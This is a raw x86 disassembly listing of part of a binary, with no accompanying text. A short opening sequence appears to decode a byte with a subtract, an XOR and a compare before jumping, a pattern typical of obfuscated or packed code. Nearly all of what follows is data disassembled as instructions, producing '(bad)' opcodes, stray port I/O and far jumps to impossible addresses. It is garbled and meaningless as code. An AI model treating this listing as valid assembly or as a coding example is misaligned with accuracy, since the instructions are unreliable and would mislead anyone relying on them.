  41421e:	movsx  di,BYTE PTR [eax+0x1]
  414223:	mov    ebx,0x3b4b
  414228:	sub    di,bx
  41422b:	mov    ebx,0x8a85
  414230:	xor    di,bx
  414233:	mov    ebx,0x4f8a
  414238:	cmp    di,bx
  41423b:	jmp    0x4165fa
  414240:	out    dx,al
  414241:	add    eax,0x6723a723
  414246:	outs   dx,BYTE PTR ds:[esi]
  414247:	sbb    DWORD PTR [edx+0x1b],0xf
  41424b:	hlt    
  41424c:	(bad)
  414251:	inc    esi
  414252:	popa   
  414253:	(bad)  
  414254:	rcr    BYTE PTR [edi+0x62],0x62
  414258:	outs   dx,DWORD PTR ds:[esi]
  414259:	xor    DWORD PTR [eax+eax*4-0x5ff279d6],eax
  414260:	mov    ch,BYTE PTR [eax+0x8545e80]
  414266:	jae    0x414290
  414268:	leave  
  414269:	jg     0x4141ff
  41426b:	sbb    BYTE PTR [ebx-0x68],0xb
  41426f:	retf   
  414270:	inc    eax
  414271:	arpl   WORD PTR [ebx+0x7b],dx
  414274:	jbe    0x4141fc
  414276:	enter  0x45a4,0x76
  41427a:	cwde   
  41427b:	mov    al,0xb4
  41427d:	daa    
  41427e:	ficomp WORD PTR [eax-0x3758f3bb]
  414284:	dec    ebx
  414285:	aad    0x82
  414287:	xor    BYTE PTR [esi+ebx*8+0x8181877],al
  41428e:	jno    0x41430f
  414290:	add    dh,BYTE PTR [ecx+edi*4]
  414293:	inc    eax
  414294:	fwait
  414295:	jle    0x414229
  414297:	jne    0x41424e
  414299:	sti    
  41429a:	jp     0x41428c
  41429c:	sbb    DWORD PTR [ecx-0x43],ebx
  41429f:	es retf 0xe315
  4142a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142a4:	or     BYTE PTR [ecx+0x5c84e8b4],0xd
  4142ab:	loope  0x414263
  4142ad:	out    dx,eax
  4142ae:	jo     0x41424d
  4142b0:	stos   BYTE PTR es:[edi],al
  4142b1:	push   ds
  4142b2:	(bad)  
  4142b3:	pop    es
  4142b4:	cmc    
  4142b5:	or     eax,0xf076cc59
  4142ba:	push   ds
  4142bb:	cmp    BYTE PTR [esi-0x52],bh
  4142be:	rol    DWORD PTR [ecx],1
  4142c0:	push   esp
  4142c1:	and    al,0xdd
  4142c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142c4:	nop
  4142c5:	repnz sub eax,0x6b1f8868
  4142cb:	leave  
  4142cc:	and    BYTE PTR [edi-0x572e2910],ah
  4142d2:	ja     0x41426e
  4142d4:	(bad)  
  4142d5:	aaa    
  4142d6:	in     eax,0xf5
  4142d8:	sbb    DWORD PTR [ebp+0x0],esi
  4142db:	into   
  4142dc:	fldcw  WORD PTR [edi+0x36]
  4142df:	cmp    al,0xf5
  4142e1:	cld    
  4142e2:	fnsave [ebx-0x31558d51]
  4142e8:	shr    DWORD PTR [esi-0x2b],0xa1
  4142ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142ed:	mov    edx,0xc8bfcd5f
  4142f2:	xor    eax,0x80269c61
  4142f7:	xor    al,0x6d
  4142f9:	jmp    0xcb20:0xddb5a4e8
  414300:	xchg   BYTE PTR [esi],dh
  414302:	xchg   ah,bh
  414304:	out    dx,al
  414305:	pusha  
  414306:	ret    0xda3c
  414309:	inc    edx
  41430a:	or     ebx,edi
  41430c:	jno    0x414298
  41430e:	hlt    
  41430f:	stos   DWORD PTR es:[edi],eax
  414310:	fild   WORD PTR ds:0x10842990
  414316:	mov    eax,DWORD PTR [esi+0x3f]
  414319:	jns    0x414383
  41431b:	add    al,0xdf
  41431d:	in     eax,0xc6
  41431f:	xor    BYTE PTR [esi+0x2900e8ba],bh
  414325:	and    al,0xfa
  414327:	cmp    dl,BYTE PTR [ecx-0x73]
  41432a:	pop    edi
  41432b:	dec    esp
  41432c:	xor    eax,0xb73d68dc
  414331:	leave  
  414332:	jbe    0x4143a0
  414334:	push   cs
  414335:	je     0x414326
  414337:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414338:	cmp    eax,0x9c3d7c73
  41433d:	inc    esp
  41433e:	dec    ecx
  41433f:	inc    edx
  414340:	in     eax,0x49
  414342:	in     al,0x36
  414344:	xchg   ecx,eax
  414345:	je     0x4142c8
  414347:	sahf   
  414348:	adc    esp,DWORD PTR [ecx-0x3b1a9bab]
  41434e:	out    dx,al
  41434f:	loope  0x414345
  414351:	fisubr DWORD PTR [ebp-0x2e14fb3c]
  414357:	retf   
  414358:	aaa    
  414359:	pop    esi
  41435a:	lods   al,BYTE PTR ds:[esi]
  41435b:	add    eax,0xebb8a7
  414360:	arpl   dx,ax
  414362:	inc    edx
  414363:	loop   0x414390
  414365:	es retf 0xfec7
  414369:	in     al,0xd0
  41436b:	int3   
  41436c:	mov    al,ds:0x30c9453c
  414371:	iret   
  414372:	push   ds
  414373:	lods   al,BYTE PTR ds:[esi]
  414374:	sub    cl,al
  414376:	mov    WORD PTR [eax],ss
  414378:	sub    DWORD PTR ds:[edx-0x4dfe42d2],esp
  41437f:	mov    ebx,ebp
  414381:	mov    ebx,0x135722c4
  414386:	clc    
  414387:	and    DWORD PTR [eax-0x63aba204],edi
  41438d:	sub    BYTE PTR [edi],ch
  41438f:	and    dl,bh
  414391:	push   cs
  414392:	ret    0xbebf
  414395:	or     eax,0xa5209f06
  41439a:	iret   
  41439b:	mov    edx,0xf5965875
  4143a0:	jg     0x4143a3
  4143a2:	cwde   
  4143a3:	ror    DWORD PTR [eax],0x27
  4143a6:	mov    cl,0x70
  4143a8:	xor    ah,BYTE PTR [ebp+ecx*4-0x68e8e526]
  4143af:	and    eax,0x8d9f8271
  4143b4:	(bad)  
  4143b5:	aad    0xca
  4143b7:	and    DWORD PTR [esp+ebp*2+0x13c5b1ba],ebx
  4143be:	shl    DWORD PTR [esi+ecx*8+0x18],cl
  4143c2:	jecxz  0x414440
  4143c4:	and    eax,0x56a0942a
  4143c9:	sbb    al,BYTE PTR [esi]
  4143cb:	mov    ds,WORD PTR [edx+0x74]
  4143ce:	lock sbb edx,esp
  4143d1:	aam    0x4
  4143d3:	push   edi
  4143d4:	inc    ebp
  4143d5:	push   0xcb6b073c
  4143da:	mov    esp,0x80a21f5b
  4143df:	retf   0x67b7
  4143e2:	dec    ebx
  4143e3:	xor    DWORD PTR [edx+0x74bf5e89],esp
  4143e9:	out    0x37,eax
  4143eb:	sbb    DWORD PTR [edx-0x66],ebx
  4143ee:	or     eax,0x14ac9699
  4143f3:	ret    0xee02
  4143f6:	add    BYTE PTR [eax-0x1c47ec7c],dl
  4143fc:	int3   
  4143fd:	push   ds
  4143fe:	aad    0xc4
  414400:	cmp    BYTE PTR [edx],ch
  414402:	adc    esi,DWORD PTR [esi]
  414404:	retf   
  414405:	jne    0x414484
  414407:	sub    eax,0x10ad178b
  41440c:	sbb    dl,BYTE PTR [ebx+0x77eb9c4f]
  414412:	pavgw  mm2,QWORD PTR [eax]
  414415:	ins    BYTE PTR es:[edi],dx
  414416:	jmp    0x7ebf6a2f
  41441b:	lea    eax,[ebx-0xb]
  41441e:	jmp    0xccd996cf
  414423:	adc    ebx,0x65cbcfaa
  414429:	addr16 jmp 0x4c27e345
  41442f:	fisub  DWORD PTR [edi]
  414431:	and    eax,0xdf5acb47
  414436:	jecxz  0x414429
  414438:	push   esp
  414439:	pop    esp
  41443a:	lock fadd DWORD PTR [edx-0x13fcdb11]
  414441:	jmp    0x570c:0xa746ae04
  414448:	inc    edx
  414449:	sti    
  41444a:	imul   esp,DWORD PTR [edx],0x77c18dff
  414450:	into   
  414451:	clc    
  414452:	aad    0x62
  414454:	mov    DWORD PTR [esi-0x25],0x6925df92
  41445b:	cmp    eax,0xf6e715ed
  414460:	(bad)  
  414461:	push   ebp
  414462:	xchg   esi,eax
  414463:	push   0xed97d4dc
  414468:	mov    eax,ds:0x595e46fb
  41446d:	test   eax,0x5331153e
  414472:	add    eax,0xde32671b
  414477:	mov    bl,0x5a
  414479:	ja     0x41444e
  41447b:	and    al,0xb1
  41447d:	xlat   BYTE PTR ds:[ebx]
  41447e:	imul   ecx,DWORD PTR [edi-0x46],0x4b
  414482:	or     DWORD PTR [ecx],esp
  414484:	dec    ecx
  414485:	xchg   BYTE PTR [eax],bh
  414487:	scas   eax,DWORD PTR es:[edi]
  414488:	in     eax,0x20
  41448a:	rol    DWORD PTR ds:0x33db47f,cl
  414490:	stos   BYTE PTR es:[edi],al
  414491:	fidivr WORD PTR [edi+0x594b3467]
  414497:	popa   
  414498:	fwait
  414499:	pusha  
  41449a:	mov    dh,0xb2
  41449c:	xor    esi,esi
  41449e:	cmp    ch,cl
  4144a0:	mov    WORD PTR [ebp-0x25b136eb],es
  4144a6:	aas    
  4144a7:	add    DWORD PTR ds:0x47828d8b,esp
  4144ad:	adc    BYTE PTR [esi],cl
  4144af:	cmp    bl,BYTE PTR [ebx]
  4144b1:	stc    
  4144b2:	popa   
  4144b3:	xor    DWORD PTR [ecx+0xf343702],esp
  4144b9:	sbb    eax,0xa1a7cbad
  4144be:	push   ebx
  4144bf:	(bad)  
  4144c0:	push   ss
  4144c1:	dec    edx
  4144c2:	call   0x2db4:0xefd63ba9
  4144c9:	enter  0x682c,0x92
  4144cd:	inc    ebp
  4144ce:	dec    ebp
  4144cf:	test   BYTE PTR ds:0x6f304174,cl
  4144d5:	out    0xdf,al
  4144d7:	out    0xe3,eax
  4144d9:	jmp    0x41447d
  4144db:	je     0x414524
  4144dd:	mov    edi,es
  4144df:	xor    esi,DWORD PTR [ebx+ecx*4+0x7ef99f83]
  4144e6:	jl     0x4144ca
  4144e8:	mov    bl,0x7d
  4144ea:	mov    esi,0x8b67ed89
  4144ef:	pop    eax
  4144f0:	js     0x414498
  4144f2:	mov    al,BYTE PTR [esi+0x6b]
  4144f5:	sub    al,0xc1
  4144f7:	push   edx
  4144f8:	cmp    edx,DWORD PTR ds:0x50ec502d
  4144fe:	lea    edi,[ebx+ebx*2-0x4b183e64]
  414505:	sti    
  414506:	mov    gs:0x69f496e5,al
  41450c:	mov    eax,ds:0x2d440bd5
  414511:	mov    es,WORD PTR [edx+0x245374f6]
  414517:	enter  0x2671,0xcf
  41451b:	sbb    DWORD PTR [ebp-0x8cdb7d6],esp
  414521:	sub    dh,BYTE PTR [edi-0x7b]
  414524:	cmp    bl,bh
  414526:	inc    ecx
  414527:	jmp    0x414534
  414529:	scas   al,BYTE PTR es:[edi]
  41452a:	addr16 ds test al,0xf2
  41452e:	fs sbb eax,edx
  414531:	mov    cl,0x9d
  414533:	pop    ss
  414534:	cld    
  414535:	inc    esp
  414536:	inc    ebx
  414537:	cmc    
  414538:	sahf   
  414539:	(bad)  
  41453a:	mov    bl,0x2e
  41453c:	pop    ebp
  41453d:	scas   eax,DWORD PTR es:[edi]
  41453e:	pop    esi
  41453f:	sub    BYTE PTR [eax-0x4e],ch
  414542:	or     DWORD PTR [ebp-0x6f],0xffffff97
  414546:	cld    
  414547:	sahf   
  414548:	adc    eax,0xc9850d00
  41454d:	scas   eax,DWORD PTR es:[edi]
  41454e:	ins    BYTE PTR es:[edi],dx
  41454f:	jl     0x41457e
  414551:	in     eax,0x41
  414553:	mov    ebx,0xe01e1ba2
  414558:	retf   0x6904
  41455b:	xchg   esi,eax
  41455c:	in     eax,dx
  41455d:	scas   eax,DWORD PTR es:[edi]
  41455e:	cli    
  41455f:	adc    edi,edx
  414561:	xor    dl,dl
  414563:	pop    ecx
  414564:	cmp    eax,0xb03d7703
  414569:	push   ds
  41456a:	gs (bad) 
  41456d:	shr    DWORD PTR [edi+0x36],1
  414570:	push   edx
  414571:	imul   esi,DWORD PTR [ebx+0x45],0x59cc10b7
  414578:	push   eax
  414579:	stos   DWORD PTR es:[edi],eax
  41457a:	in     al,0xd2
  41457c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41457d:	mov    esi,DWORD PTR [ecx+0x1b34754c]
  414583:	pop    eax
  414584:	adc    dh,bh
  414586:	fldenv ds:[edi]
  414589:	test   al,0x9f
  41458b:	and    cl,ch
  41458d:	push   esp
  41458e:	inc    esi
  41458f:	sahf   
  414590:	dec    ecx
  414591:	xchg   esp,eax
  414592:	add    ebx,ebp
  414594:	ss repnz push ebx
  414597:	dec    ecx
  414598:	shr    BYTE PTR [ebx+eiz*8-0x64426f9b],0x18
  4145a0:	push   ss
  4145a1:	mov    edi,0x7a967e4a
  4145a6:	sub    al,0x6
  4145a8:	mov    ebp,0x769adadb
  4145ad:	mov    al,ds:0x74733b68
  4145b2:	xchg   edi,eax
  4145b3:	clc    
  4145b4:	(bad)  
  4145b6:	mov    esp,0x3e0d688f
  4145bb:	call   0x232db918
  4145c0:	sbb    ch,BYTE PTR [ecx+0x5cda02d3]
  4145c6:	mov    esi,0xf37940ea
  4145cb:	and    BYTE PTR [ecx],ch
  4145cd:	inc    BYTE PTR [eax+0x3b]
  4145d0:	xchg   ebp,eax
  4145d1:	cmp    dl,al
  4145d3:	add    esp,ebx
  4145d5:	pop    ds
  4145d6:	mov    DWORD PTR [esi],ebp
  4145d8:	retf   
  4145d9:	jp     0x4145a5
  4145db:	(bad)  [ebx]
  4145dd:	or     eax,0x39577c3b
  4145e2:	xchg   esp,eax
  4145e3:	and    esp,DWORD PTR [eax]
  4145e5:	mov    DWORD PTR [edi-0x3a],ebx
  4145e8:	call   0x90c5953
  4145ed:	cmc    
  4145ee:	out    0xf9,eax
  4145f0:	aam    0xfc
  4145f2:	imul   eax,DWORD PTR [ebx-0x2c],0x28ca41e1
  4145f9:	rdtsc  
  4145fb:	int    0x9a
  4145fd:	xchg   ebx,eax
  4145fe:	out    0x3,al
  414600:	cdq    
  414601:	lods   al,BYTE PTR ds:[esi]
  414602:	sub    al,ch
  414604:	enterw 0xfa8b,0x9
  414609:	push   edi
  41460a:	mov    edx,0xf580bfe9
  41460f:	iret   
  414610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414611:	repz push eax
  414613:	ja     0x4145e9
  414615:	leave  
  414616:	fdiv   st,st(2)
  414618:	stos   DWORD PTR es:[edi],eax
  414619:	jae    0x4145e4
  41461b:	mov    WORD PTR [eax],cs
  41461d:	dec    ebx
  41461e:	fcomp  DWORD PTR [edx+eiz*1+0x64c4dc62]
  414625:	and    DWORD PTR [edx+0xdec8741],ecx
  41462b:	iret   
  41462c:	repnz cmp bl,al
  41462f:	adc    ecx,DWORD PTR [edi-0x1da39819]
  414635:	xor    DWORD PTR [eax],edx
  414637:	jecxz  0x4145eb
  414639:	retf   
  41463a:	out    dx,al
  41463b:	add    al,0x4f
  41463d:	jmp    0x4cc8:0x36aa9b6b
  414644:	ins    BYTE PTR es:[edi],dx
  414645:	xchg   ebp,eax
  414646:	adc    al,0xda
  414648:	(bad)  
  414649:	push   esi
  41464a:	adc    BYTE PTR [ecx+edx*1],ch
  41464d:	sbb    ebx,0x3bfb152a
  414653:	leave  
  414654:	mov    edx,0x9359e25
  414659:	xor    eax,0x54a33ba7
  41465e:	leave  
  41465f:	nop
  414660:	mov    cs,ecx
  414662:	and    eax,0x5e962e19
  414667:	sbb    DWORD PTR [edx*1+0xc3d5874],esp
  41466e:	push   esi
  41466f:	push   ss
  414670:	jmp    0xbedf:0xea3dd8d8
  414677:	je     0x4146ea
  414679:	(bad)  [edi]
  41467b:	pop    ebp
  41467c:	mov    ah,ah
  41467e:	mov    cl,0xcc
  414680:	fdiv   DWORD PTR [bx+0x29]
  414684:	inc    ecx
  414685:	leave  
  414686:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414687:	push   esp
  414688:	inc    ebx
  414689:	mov    al,BYTE PTR [edx-0x704fbf5f]
  41468f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414690:	ja     0x4146dd
  414692:	mov    ebx,0xd06901eb
  414697:	inc    eax
  414698:	push   0x5fb7bea1
  41469d:	cmp    DWORD PTR [esi-0x52],0x1c
  4146a1:	and    dl,BYTE PTR [edx-0x33]
  4146a4:	lock or ebx,ecx
  4146a7:	inc    esp
  4146a8:	jp     0x4146c0
  4146aa:	je     0x41469a
  4146ac:	int3   
  4146ad:	mov    dl,0x9
  4146af:	cmc    
  4146b0:	and    al,0xf5
  4146b2:	mov    dl,0x91
  4146b4:	daa    
  4146b5:	scas   eax,DWORD PTR es:[edi]
  4146b6:	daa    
  4146b7:	lahf   
  4146b8:	arpl   bx,ax
  4146ba:	lock ins BYTE PTR es:[edi],dx
  4146bc:	push   ecx
  4146bd:	mov    cl,BYTE PTR [esp+esi*1-0x5312bdd3]
  4146c4:	adc    esi,DWORD PTR [ebx-0x32c4328b]
  4146ca:	or     ecx,edi
  4146cc:	xchg   ebx,eax
  4146cd:	mov    bl,0xca
  4146cf:	aad    0xf1
  4146d1:	mov    ecx,0xd3e73bd1
  4146d6:	cmp    dh,BYTE PTR [edi]
  4146d8:	xor    dl,BYTE PTR [eax]
  4146da:	xchg   edx,eax
  4146db:	pop    ebx
  4146dc:	ja     0xf6719357
  4146e2:	enter  0x277a,0x69
  4146e6:	dec    ebx
  4146e7:	stc    
  4146e8:	mov    edi,0x51590379
  4146ed:	adc    ecx,DWORD PTR ds:0x75f476aa
  4146f3:	jmp    0x5fa:0x32b19e4
  4146fa:	fs pop esi
  4146fc:	add    al,0xcb
  4146fe:	adc    eax,0x3960fda2
  414703:	cwde   
  414704:	adc    edi,DWORD PTR [eax+ecx*4+0x32537564]
  41470b:	(bad)  
  41470c:	idiv   edi
  41470e:	cmp    DWORD PTR [edx],edi
  414710:	into   
  414711:	and    dh,0xbb
  414714:	jle    0x4146c9
  414716:	sar    ebp,0x4d
  414719:	pop    esp
  41471a:	xchg   edx,eax
  41471b:	jmp    0xc3a4f8e2
  414720:	jl     0x414701
  414722:	sub    al,0x17
  414724:	jnp    0x414799
  414726:	ret    
  414727:	jle    0x414720
  414729:	test   eax,0xd4fc35b9
  41472e:	mov    ds:0xd126dced,eax
  414733:	pop    ebx
  414734:	out    0x11,al
  414736:	inc    edx
  414737:	mov    edx,0xc0ddeacc
  41473c:	pushf  
  41473d:	add    al,0x77
  41473f:	(bad)  
  414740:	jmp    0xd2a6:0xaa2e4a1
  414747:	mov    ds:0xd51b5ac5,eax
  41474c:	jg     0x414794
  41474e:	jo     0x41479e
  414750:	fwait
  414751:	cdq    
  414752:	dec    ebx
  414753:	or     cl,cl
  414755:	addr16 and eax,0xabefa450
  41475b:	mov    al,0x7e
  41475d:	and    ah,BYTE PTR [ebx+ecx*8+0x7ee17370]
  414764:	dec    ebp
  414765:	inc    ebx
  414766:	or     al,0x7f
  414768:	stc    
  414769:	out    dx,al
  41476a:	pop    ss
  41476b:	mov    ebp,0x5d45266a
  414770:	loop   0x414704
  414772:	or     eax,0x6b6eddcc
  414777:	adc    eax,0x448188a2
  41477c:	mov    dh,0x3d
  41477e:	sub    ecx,DWORD PTR [edx]
  414780:	stos   DWORD PTR es:[edi],eax
  414781:	call   0x30c:0x4464795c
  414788:	mov    ds:0x7ef1ca88,al
  41478d:	inc    esi
  41478e:	lods   al,BYTE PTR ds:[esi]
  41478f:	add    DWORD PTR [ebp+ebx*2-0x2a0df54a],esp
  414796:	push   ss
  414797:	mov    ecx,0x630b8049
  41479c:	xchg   edx,eax
  41479d:	pop    eax
  41479e:	leave  
  41479f:	dec    ebx
  4147a0:	syscall 
  4147a2:	stos   BYTE PTR es:[edi],al
  4147a3:	mov    esp,0xc056a2d9
  4147a8:	xchg   ebx,eax
  4147a9:	ins    BYTE PTR es:[edi],dx
  4147aa:	test   BYTE PTR [edi-0x3ec63a62],0x8e
  4147b1:	xor    DWORD PTR [ecx+0x5e4abf28],ecx
  4147b7:	es jg  0x4147cb
  4147ba:	xor    eax,0xd1b6035d
  4147bf:	popf   
  4147c0:	test   eax,ebx
  4147c2:	inc    ebx
  4147c3:	es ins BYTE PTR es:[edi],dx
  4147c5:	(bad)  
  4147c7:	iret   
  4147c8:	pmulhw mm2,mm7
  4147cb:	imul   edx,ecx,0x52533fb5
  4147d1:	inc    ebx
  4147d2:	shr    ch,0x33
  4147d5:	or     al,BYTE PTR [esi-0x3c]
  4147d8:	jns    0x4147b7
  4147da:	push   eax
  4147db:	pop    esp
  4147dc:	push   esi
  4147dd:	sub    dh,BYTE PTR [ecx]
  4147df:	leave  
  4147e0:	(bad)  
  4147e1:	cmp    dh,BYTE PTR [ecx-0xb02b54]
  4147e7:	(bad)  
  4147e8:	test   eax,0xa9aa72a0
  4147ed:	xor    esi,esp
  4147ef:	pop    esi
  4147f0:	cs or  al,0x23
  4147f3:	jge    0x414799
  4147f5:	xchg   edx,eax
  4147f6:	hlt    
  4147f7:	xor    eax,0x9448b205
  4147fc:	and    DWORD PTR [ecx+0x7d],ebp
  4147ff:	adc    edi,DWORD PTR es:[ebx-0x6f]
  414803:	mov    ebp,0xf686cf5a
  414808:	mov    esi,0x16d75d
  41480d:	leave  
  41480e:	mov    esp,0x2464aee6
  414813:	dec    edx
  414814:	fst    DWORD PTR [eax+0x14]
  414817:	cwde   
  414818:	or     al,0x17
  41481a:	arpl   WORD PTR [eax+0x670fe6b9],dx
  414820:	xchg   edx,eax
  414821:	or     ecx,ebx
  414823:	mul    BYTE PTR [esi-0xbd0ab0c]
  414829:	and    DWORD PTR [esi-0x47],esp
  41482c:	ss call 0x3c60:0xa2f8
  414833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414834:	xor    ah,BYTE PTR [eax]
  414836:	sbb    BYTE PTR [ecx],bh
  414838:	into   
  414839:	retf   
  41483a:	dec    ebx
  41483b:	xchg   DWORD PTR [edx],edi
  41483d:	xor    BYTE PTR [ecx-0x2b],dh
  414840:	lahf   
  414841:	pop    ss
  414842:	call   0x83d4:0x7f05528c
  414849:	inc    eax
  41484a:	hlt    
  41484b:	push   ss
  41484c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41484d:	xor    dh,BYTE PTR [ecx+eax*2]
  414850:	fadd   DWORD PTR [edx]
  414852:	ss call 0x570d:0xd5693ad9
  41485a:	daa    
  41485b:	mov    cl,0xe8
  41485d:	and    BYTE PTR [ebx+0x78],dh
  414860:	jb     0x414887
  414862:	sub    al,0xe6
  414864:	jno    0x414838
  414866:	dec    edx
  414867:	sub    BYTE PTR [edi+edx*4+0x114b0400],0x4e
  41486f:	fs push cs
  414871:	adc    DWORD PTR [ebx+eiz*4-0x4a],esp
  414875:	imul   ebp,DWORD PTR [edx+0x22],0x1b
  414879:	(bad)  
  41487a:	dec    ebp
  41487b:	jbe    0x414830
  41487d:	sub    DWORD PTR [ebp+0xe],esp
  414880:	jo     0x414818
  414882:	xchg   ebx,eax
  414883:	push   esp
  414884:	mov    ebx,0x74c25e1
  414889:	xchg   ebx,eax
  41488a:	jl     0x414892
  41488c:	jle    0x4148e0
  41488e:	adc    eax,0xaff03ff9
  414893:	es sub al,0xb1
  414896:	repz and DWORD PTR [ebx-0x24e33dab],ebp
  41489d:	clc    
  41489e:	mov    bl,0x85
  4148a0:	std    
  4148a1:	lds    ebx,FWORD PTR [eax+0x7a]
  4148a4:	mov    BYTE PTR [esi+ecx*8],ah
  4148a7:	xchg   edx,eax
  4148a8:	lahf   
  4148a9:	xor    ebp,DWORD PTR [ecx-0x6e]
  4148ac:	inc    edx
  4148ad:	xchg   esp,eax
  4148ae:	mov    bh,0x7d
  4148b0:	jnp    0x41485e
  4148b2:	out    0xbf,al
  4148b4:	inc    edi
  4148b5:	leave  
  4148b6:	pusha  
  4148b7:	in     al,0xd7
  4148b9:	int    0xc
  4148bb:	add    edx,DWORD PTR [ebx]
  4148bd:	mov    ch,0x93
  4148bf:	push   0xffffffe8
  4148c1:	and    al,0x76
  4148c3:	aas    
  4148c4:	out    dx,eax
  4148c5:	sti    
  4148c6:	pushw  es
  4148c8:	dec    ecx
  4148c9:	mov    cl,0x88
  4148cb:	cmp    eax,0x7c8b8
  4148d0:	test   eax,0xdc93a6a2
  4148d5:	pop    ebx
  4148d6:	shl    DWORD PTR [ebx],cl
  4148d8:	dec    esi
  4148d9:	(bad)  
  4148da:	pop    ebx
  4148db:	mov    cl,0x4f
  4148dd:	loope  0x4148ac
  4148df:	js     0x41491c
  4148e1:	pop    edx
  4148e2:	popa   
  4148e3:	cs dec edi
  4148e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148e6:	xchg   BYTE PTR [eax],bl
  4148e8:	ss xchg esi,eax
  4148ea:	lds    esp,FWORD PTR [eax+0x5]
  4148ed:	ds ffreep st(0)
  4148f0:	push   esp
  4148f1:	xlat   BYTE PTR ds:[ebx]
  4148f2:	mov    esp,0xd1f0188
  4148f7:	sub    eax,DWORD PTR [ecx-0xaed8c62]
  4148fd:	add    BYTE PTR [ebx+0x497cd8b4],0x53
  414904:	das    
  414905:	neg    BYTE PTR [ebx]
  414907:	or     dl,0xee
  41490a:	(bad)  
  41490b:	popa   
  41490c:	jle    0x41496c
  41490e:	mov    al,ds:0xda57ac34
  414913:	push   eax
  414914:	pop    ebx
  414915:	push   esi
  414916:	mov    ch,0x64
  414918:	lock in eax,dx
  41491a:	int3   
  41491b:	in     eax,dx
  41491c:	into   
  41491d:	inc    esi
  41491e:	sub    al,BYTE PTR [ebx+edi*1-0x4f]
  414922:	call   0x3348778f
  414927:	dec    edi
  414928:	adc    eax,0xbef4f9e6
  41492d:	xchg   ecx,eax
  41492e:	push   ecx
  41492f:	das    
  414930:	lock stc 
  414932:	xchg   esi,eax
  414933:	xor    eax,0xac0b3131
  414938:	(bad)  
  414939:	fnstsw WORD PTR [ebp-0x29]
  41493c:	sahf   
  41493d:	ja     0x414938
  41493f:	or     al,0xd
  414941:	mov    bl,BYTE PTR [esi]
  414943:	stc    
  414944:	jle    0x4149a8
  414946:	dec    ecx
  414947:	aam    0x6a
  414949:	(bad)  
  41494a:	test   DWORD PTR [edx+0x7c],eax
  41494d:	mov    bl,0x8c
  41494f:	or     al,0x2
  414951:	xchg   esi,eax
  414952:	mov    cl,0x6b
  414954:	mov    eax,0xc777c4ae
  414959:	retf   0x5d04
  41495c:	in     al,dx
  41495d:	xlat   BYTE PTR ds:[ebx]
  41495e:	aad    0x54
  414960:	scas   eax,DWORD PTR es:[edi]
  414961:	cmp    dh,al
  414963:	fsubp  st(7),st
  414965:	dec    edi
  414966:	add    BYTE PTR ds:0xc62f3667,ch
  41496c:	dec    ecx
  41496d:	in     al,dx
  41496e:	sub    eax,0x36e64b35
  414973:	sbb    eax,0xf26539d5
  414978:	jge    0x4148ff
  41497a:	cmp    DWORD PTR [eax+0x54813fca],eax
  414980:	inc    ecx
  414981:	stos   BYTE PTR es:[edi],al
  414982:	popf   
  414983:	xchg   ecx,eax
  414984:	pop    eax
  414985:	leave  
  414986:	xor    BYTE PTR [eax+0x59db7aad],dl
  41498c:	push   0x45370b28
  414991:	jne    0x4149f8
  414993:	stos   DWORD PTR es:[edi],eax
  414994:	ins    BYTE PTR es:[edi],dx
  414995:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414996:	js     0x414983
  414998:	cmp    al,0xb1
  41499a:	test   BYTE PTR [edx],bh
  41499c:	out    dx,al
  41499d:	out    dx,eax
  41499e:	fwait
  41499f:	and    dl,BYTE PTR [ebp-0x5d]
  4149a2:	int3   
  4149a3:	(bad)  
  4149a4:	jmp    0xb309:0x25787b7d
  4149ab:	leave  
  4149ac:	xchg   edx,eax
  4149ad:	pop    ebp
  4149ae:	ins    DWORD PTR es:[edi],dx
  4149af:	ds pop ebx
  4149b1:	jo     0x4149be
  4149b3:	inc    eax
  4149b4:	mov    dh,al
  4149b6:	and    edx,ebp
  4149b8:	jle    0x414966
  4149ba:	lea    edi,[esi]
  4149bc:	mov    dl,0x6b
  4149be:	jne    0x4149f5
  4149c0:	js     0x414975
  4149c2:	jnp    0x414a1a
  4149c4:	mov    dh,0x17
  4149c6:	adc    esi,DWORD PTR [eax+0x6f6a304b]
  4149cc:	bound  esi,QWORD PTR [ecx-0x6a]
  4149cf:	jae    0x41498d
  4149d1:	push   ebp
  4149d2:	ds fs out 0x59,eax
  4149d6:	(bad)  
  4149d7:	cli    
  4149d8:	inc    DWORD PTR [ecx+eiz*2+0x33a096e2]
  4149df:	neg    DWORD PTR [esi+0x69e46989]
  4149e5:	rcr    DWORD PTR [ebx+0x1b],0xc2
  4149e9:	arpl   WORD PTR [edx-0x3d0b6217],bp
  4149ef:	pusha  
  4149f0:	(bad)  
  4149f1:	sub    DWORD PTR [esi],eax
  4149f3:	aam    0x59
  4149f5:	and    BYTE PTR [edi+0x231b3363],bh
  4149fb:	mov    ebx,0xe790f825
  414a00:	ror    DWORD PTR [ebx-0x7b],1
  414a03:	sub    ah,dh
  414a05:	lods   eax,DWORD PTR ds:[esi]
  414a06:	push   edi
  414a07:	mov    cs,ebx
  414a09:	scas   al,BYTE PTR es:[edi]
  414a0a:	adc    esp,DWORD PTR [ebx+0x3c78b452]
  414a10:	cmp    BYTE PTR [esi+0xd51a072],al
  414a16:	and    al,0xd4
  414a18:	push   esi
  414a19:	ret    0x1d46
  414a1c:	xor    eax,DWORD PTR [esi]
  414a1e:	(bad)  
  414a1f:	jecxz  0x4149d8
  414a21:	adc    al,0xbc
  414a23:	es mov ch,0xba
  414a26:	(bad)  
  414a27:	mov    eax,0xcdfaac65
  414a2c:	mov    ebx,0x46e90cc5
  414a31:	stos   BYTE PTR es:[edi],al
  414a32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a33:	xor    al,0x28
  414a35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a36:	neg    BYTE PTR [esi]
  414a38:	cld    
  414a39:	test   DWORD PTR [ebx],0xabd27243
